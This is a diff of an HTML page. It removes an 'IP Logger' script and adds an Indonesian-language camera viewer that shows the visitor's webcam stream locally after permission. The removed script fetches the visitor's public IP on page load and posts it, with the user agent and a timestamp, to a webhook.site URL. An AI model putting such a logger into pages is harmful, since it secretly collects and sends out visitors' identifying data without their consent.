@@ -1,29 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>IP Logger</title>
-  <script>
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        const ua = navigator.userAgent;
-
-        fetch("https://webhook.site/ba228a93-d130-4f5a-986c-d81cab91fcaa", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            ip: ip,
-            userAgent: ua,
-            timestamp: new Date().toISOString()
-          })
-        });
-      });
-  </script>
+  <title>Akses Kamera</title>
 </head>
 <body>
-  <h1>Testing IP Logger</h1>
+  <h1>Kamera Viewer</h1>
+  <video id="video" width="640" height="480" autoplay playsinline></video>
+  <p id="status">Menunggu izin kamera...</p>
+
+  <script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+
+    // Minta akses kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        status.textContent = "Kamera aktif!";
+      })
+      .catch(err => {
+        status.textContent = "Gagal mengakses kamera: " + err.message;
+        console.error("Error kamera:", err);
+      });
+  </script>
 </body>
 </html>
